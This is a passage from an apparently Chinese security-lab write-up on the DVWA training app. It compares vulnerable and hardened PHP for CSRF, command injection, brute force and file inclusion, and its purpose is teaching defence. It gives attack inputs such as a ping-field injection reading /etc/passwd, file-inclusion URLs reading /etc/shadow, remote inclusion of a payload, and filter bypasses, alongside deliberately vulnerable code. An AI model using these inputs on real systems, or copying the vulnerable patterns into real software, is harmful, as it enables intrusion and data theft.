PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>在high的基础上，直接进行了密码再认证，这样一来，即使盗取了token，没有原始密码，也无法进行修改密码的操作，这样CSRF就可以完全避免了。所以通过这个CSRF系列，我们可以知晓，在csrf防御中，采用关键操作的原子性认证，是避免这一漏洞攻击的不二办法。其实我们只关注了CSRF部分，在之前的level中，也还存在了sql注入，在这个impossible版本里，还使用了之前提到的预操纵来进行数据库交互，降低了sql注入的风险。</p>
+<h3 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h3><ul>
+<li>Low level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// Windows </span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// *nix </span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>过分相信用户的输入，直接拼接到ping 命令中，会造成命令注入。注意到常用的bash命令拼接的方式有<code>||</code>.<code>&amp;&amp;</code>,<code>|</code>,<code>&amp;</code>,<code>;</code>这五个，所以由于没有过滤完全，我们直接进行命令拼接，然后执行任意命令，如<code>127.0.0.1;cat /etc/passwd</code>。</p>
+<ul>
+<li>Medium level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist </span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>( </span><br><span class="line">        <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line">    ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist). </span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// Windows </span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// *nix </span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>这里采用黑名单过滤的方式，注意到黑名单的办法存在的通病就是过滤不完全。可以看到这里也一样，没有把之前提到的东西给过滤完全。其实highlevel也是一样的，过滤语句写得不严谨，多加了空格，造成绕过，这里就不再展开叙述了。同过这个例子可以直观的看到黑名单式过滤方式是不安全的，容易出岔子。接着我们将看到Impossible等级下的白名单试想方式。直接指定只接受<code>num.num.num.num</code>型的输入，也就是我们期望的输入，从而避免了命令执行。</p>
+<ul>
+<li>Impossible level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ]; </span><br><span class="line">    $target = stripslashes( $target ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects </span></span><br><span class="line">    $octet = explode( <span class="string">"."</span>, $target ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer </span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( $octet[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="number">4</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// If all 4 octets are int's put the IP back together. </span></span><br><span class="line">        $target = $octet[<span class="number">0</span>] . <span class="string">'.'</span> . $octet[<span class="number">1</span>] . <span class="string">'.'</span> . $octet[<span class="number">2</span>] . <span class="string">'.'</span> . $octet[<span class="number">3</span>]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">            <span class="comment">// Windows </span></span><br><span class="line">            $cmd = shell_exec( <span class="string">'ping  '</span> . $target ); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// *nix </span></span><br><span class="line">            $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>暴力枚举攻击，服务端没有在后台设置错误次数上限和相关校验，就会给攻击者暴力枚举用户或者基于字典的密码暴力破解。所以正确的代码编写规范需要规定容许的错误尝试次数，超过这个值就会锁定账户一个定义长的时间。这里需要明确，光加入一个随机的token就想避免Brute Force是相当幼稚的，攻击者通过python脚本来抓取页面的token，就可以完全绕过，这也是high等级所犯的错。这里就不展示，只列出impossible等级和low 等级的代码，供日后查阅：</p>
+<ul>
+<li><p>low level</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get username </span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password </span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ]; </span><br><span class="line">    $pass = md5( $pass ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database </span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysql_num_rows( $result ) == <span class="number">1</span> ) &#123; </span><br><span class="line">        <span class="comment">// Get users details </span></span><br><span class="line">        $avatar = mysql_result( $result, <span class="number">0</span>, <span class="string">"avatar"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Login failed </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Impossible level</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Login'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input </span></span><br><span class="line">    $user = $_POST[ <span class="string">'username'</span> ]; </span><br><span class="line">    $user = stripslashes( $user ); </span><br><span class="line">    $user = mysql_real_escape_string( $user ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input </span></span><br><span class="line">    $pass = $_POST[ <span class="string">'password'</span> ]; </span><br><span class="line">    $pass = stripslashes( $pass ); </span><br><span class="line">    $pass = mysql_real_escape_string( $pass ); </span><br><span class="line">    $pass = md5( $pass ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values </span></span><br><span class="line">    $total_failed_login = <span class="number">3</span>; </span><br><span class="line">    $lockout_time       = <span class="number">15</span>; </span><br><span class="line">    $account_locked     = <span class="keyword">false</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information) </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">    $row = $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out. </span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $row[ <span class="string">'failed_login'</span> ] &gt;= $total_failed_login ) )  &#123; </span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration! </span></span><br><span class="line">        <span class="comment">//echo "&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;"; </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again </span></span><br><span class="line">        $last_login = $row[ <span class="string">'last_login'</span> ]; </span><br><span class="line">        $last_login = strtotime( $last_login ); </span><br><span class="line">        $timeout    = strtotime( <span class="string">"&#123;$last_login&#125; +&#123;$lockout_time&#125; minutes"</span> ); </span><br><span class="line">        $timenow    = strtotime( <span class="string">"now"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn't locked the account </span></span><br><span class="line">        <span class="keyword">if</span>( $timenow &gt; $timeout ) </span><br><span class="line">            $account_locked = <span class="keyword">true</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password) </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':password'</span>, $pass, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">    $row = $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login... </span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $account_locked == <span class="keyword">false</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// Get users details </span></span><br><span class="line">        $avatar       = $row[ <span class="string">'avatar'</span> ]; </span><br><span class="line">        $failed_login = $row[ <span class="string">'failed_login'</span> ]; </span><br><span class="line">        $last_login   = $row[ <span class="string">'last_login'</span> ]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login? </span></span><br><span class="line">        <span class="keyword">if</span>( $failed_login &gt;= $total_failed_login ) &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;"</span>; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Login failed </span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>我们可以看到，在impossible代码中，不但设置了错误次数锁，Anti-CSRF token,而且还提供了暴力尝试信息反馈，当用户登陆成功后会将被暴力登陆的次数给反馈给正确登陆的用户。这个实现得益于，每次错误尝试都会更新last_login的时间和failed_login+1操作，然后将之入库。</p>
+<h3 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion)"></a>Local File Inclusion)</h3><blockquote>
+<p>漏洞根据利用方式可以分为：本地文件包含(Local File Inclusion),简称LFI。远程文件包含(Remote File Inclusion),简称RFI。</p>
+</blockquote>
+<p>涉及到的函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。</span><br><span class="line"> </span><br><span class="line">include_once()：和include()功能相同，区别在于当重复调用同一文件时，程序只调用一次。</span><br><span class="line"> </span><br><span class="line">require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。</span><br><span class="line"> </span><br><span class="line">require_once()：和require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。</span><br></pre></td></tr></table></figure></p>
+<p>文件包含光从字面意思来看是可以通过漏洞利用泄露一些本地敏感文件，但是益于以上几个函数在包含文件的时候是默认把文件当成代码来对待，如果出现可执行的php片段就会执行这一性质，文件包含漏洞一般是可以进行任意代码执行的，只要我们能够让服务器包含我们可控的代码段。</p>
+<ul>
+<li>Low level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>没有对我们的输入做任何过滤，可以说是一点安全意识都没有。随便利用。举个栗子：<code>http://localhost/dvwa/vulnerabilities/fi/page=/etc/shadow</code>当然也可以在服务端写下poc.php,利用http协议实现代码执行<code>http://localhost/dvwa/vulnerabilities/fi/page=http://[ip]/poc.php</code>。前提条件是<code>allow_url_fopen</code>和<code>allow_url_include</code>处于打开状态。</p>
+<ul>
+<li>Medium level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation </span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, $file ); </span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, $file ); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>首先这个基于黑名单的过滤，压根就没有把本地绝对路径考虑到，其次可以使用<code>..././</code>,<code>htthttpp</code>进行绕过。</p>
+<ul>
+<li>High level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation </span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">"file*"</span>, $file ) &amp;&amp; $file != <span class="string">"include.php"</span> ) &#123; </span><br><span class="line">    <span class="comment">// This isn't the page we want! </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>; </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>这是一种基于白名单的过滤，只接受前缀为“file”的文件，咋一看很ok，然而却疏忽了file协议。<code>http://localhost/vulnerabilities/fi/?page=file:///etc/passwd</code></p>
+<ul>
+<li>Impossible level<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// The page we wish to display </span><br><span class="line">$file = $_GET[ &apos;page&apos; ]; </span><br><span class="line"></span><br><span class="line">// Only allow include.php or file&#123;1..3&#125;.php </span><br><span class="line">if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123; </span><br><span class="line">    // This isn&apos;t the page we want! </span><br><span class="line">    echo &quot;ERROR: File not found!&quot;; </span><br><span class="line">    exit; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>这是相当的白名单，你赢了。但是想要文件量巨大的场景中维护这么一张白名单有点不太理智，所以笔者这种硬编码的方式不太常用。</p>
